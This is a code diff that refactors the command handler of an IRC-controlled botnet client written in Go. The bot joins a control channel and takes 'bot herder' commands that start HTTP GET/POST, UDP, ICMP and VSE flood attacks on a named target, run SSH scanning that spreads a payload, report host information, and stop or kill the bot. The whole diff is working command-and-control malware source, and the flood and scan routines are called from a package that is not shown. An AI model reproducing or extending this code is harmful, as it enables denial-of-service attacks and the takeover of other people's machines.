@@ -21,7 +21,14 @@ const (
 func bot(server string) error {
 	irc := pkg.IRC_Conn(server)
 	tp := textproto.NewReader(bufio.NewReader(irc))
-	pkg.IRC_Login(irc, IRC_Channel, IRC_Chan_Password)
+
+	setup := &pkg.IRC{
+		Report:  irc,
+		Channel: IRC_Channel,
+		ChanKey: IRC_Chan_Password,
+	}
+
+	setup.IRC_Login()
 
 	for {
 		ircRead, err := tp.ReadLine()
@@ -32,14 +39,14 @@ func bot(server string) error {
 		//Server interact
 		go func() {
 			if pkg.IRC_Find(ircRead, "PING :") {
-				pkg.IRC_Send(irc, "PONG "+pkg.IRC_Recv(ircRead, 1))
+				setup.IRC_Send("PONG " + pkg.IRC_Recv(ircRead, 1))
 			}
 		}()
 
 		//Check is user modes and Join IRC channel
 		if pkg.IRC_Find(ircRead, "+iwx") || pkg.IRC_Find(ircRead, "+i") ||
 			pkg.IRC_Find(ircRead, "+w") || pkg.IRC_Find(ircRead, "+x") {
-			pkg.IRC_Send(irc, fmt.Sprint("JOIN "+IRC_Channel+IRC_Chan_Password))
+			setup.IRC_Send(fmt.Sprint("JOIN " + IRC_Channel + IRC_Chan_Password))
 		}
 
 		//Check bot herder commands
@@ -47,42 +54,42 @@ func bot(server string) error {
 			switch {
 			case pkg.IRC_Find(ircRead, "?get"):
 				pkg.DDoS_Switch = false
-				pkg.IRC_Report(irc, IRC_Channel, "START HTTP GET FLOOD TO: "+
+				setup.IRC_Report("START HTTP GET FLOOD TO: " +
 					pkg.IRC_Recv(ircRead, 4))
-				pkg.GET(pkg.IRC_Recv(ircRead, 4), IRC_Channel, irc)
+				setup.GET(pkg.IRC_Recv(ircRead, 4))
 			case pkg.IRC_Find(ircRead, "?post"):
 				pkg.DDoS_Switch = false
-				pkg.IRC_Report(irc, IRC_Channel, "START HTTP POST FLOOD TO: "+
+				setup.IRC_Report("START HTTP POST FLOOD TO: " +
 					pkg.IRC_Recv(ircRead, 4))
-				pkg.POST(pkg.IRC_Recv(ircRead, 4), IRC_Channel, irc)
+				setup.POST(pkg.IRC_Recv(ircRead, 4))
 			case pkg.IRC_Find(ircRead, "?udp"):
 				pkg.DDoS_Switch = false
-				pkg.IRC_Report(irc, IRC_Channel, "START UDP FLOOD TO: "+
+				setup.IRC_Report("START UDP FLOOD TO: " +
 					pkg.IRC_Recv(ircRead, 4))
-				pkg.DUDP(pkg.IRC_Recv(ircRead, 4), pkg.IRC_Recv(ircRead, 5), IRC_Channel, irc)
+				setup.DUDP(pkg.IRC_Recv(ircRead, 4), pkg.IRC_Recv(ircRead, 5))
 			case pkg.IRC_Find(ircRead, "?icmp"):
 				pkg.DDoS_Switch = false
-				pkg.IRC_Report(irc, IRC_Channel, "START ICMP FLOOD TO: "+
+				setup.IRC_Report("START ICMP FLOOD TO: " +
 					pkg.IRC_Recv(ircRead, 4))
-				pkg.ICMP(pkg.IRC_Recv(ircRead, 4), IRC_Channel, irc)
+				setup.ICMP(pkg.IRC_Recv(ircRead, 4))
 			case pkg.IRC_Find(ircRead, "?vse"):
 				pkg.DDoS_Switch = false
-				pkg.IRC_Report(irc, IRC_Channel, "START VSE FLOOD TO: "+
+				setup.IRC_Report("START VSE FLOOD TO: " +
 					pkg.IRC_Recv(ircRead, 4))
-				pkg.VSE(pkg.IRC_Recv(ircRead, 4), IRC_Channel, irc)
+				setup.VSE(pkg.IRC_Recv(ircRead, 4))
 			case pkg.IRC_Find(ircRead, "?scan"):
-				pkg.IRC_Report(irc, IRC_Channel, "START SCANNING.")
-				pkg.SSH_Conn(irc, pkg.IRC_Recv(ircRead, 4), IRC_Channel, New_Payload_Name)
+				setup.IRC_Report("START SCANNING.")
+				setup.SSH_Conn(pkg.IRC_Recv(ircRead, 4), New_Payload_Name)
 			case pkg.IRC_Find(ircRead, "?info"):
-				pkg.ReportInf(irc, IRC_Channel)
+				setup.ReportInf()
 			case pkg.IRC_Find(ircRead, "?kill"):
 				os.Exit(0)
 			case pkg.IRC_Find(ircRead, "?stopddos"):
 				pkg.DDoS_Switch = true
-				pkg.IRC_Report(irc, IRC_Channel, "STOP ATTACKING.")
+				setup.IRC_Report("STOP ATTACKING.")
 			case pkg.IRC_Find(ircRead, "?stopscan"):
 				pkg.Scan_Switch = true
-				pkg.IRC_Report(irc, IRC_Channel, "STOP SCANNING.")
+				setup.IRC_Report("STOP SCANNING.")
 			}
 		}()
 	}
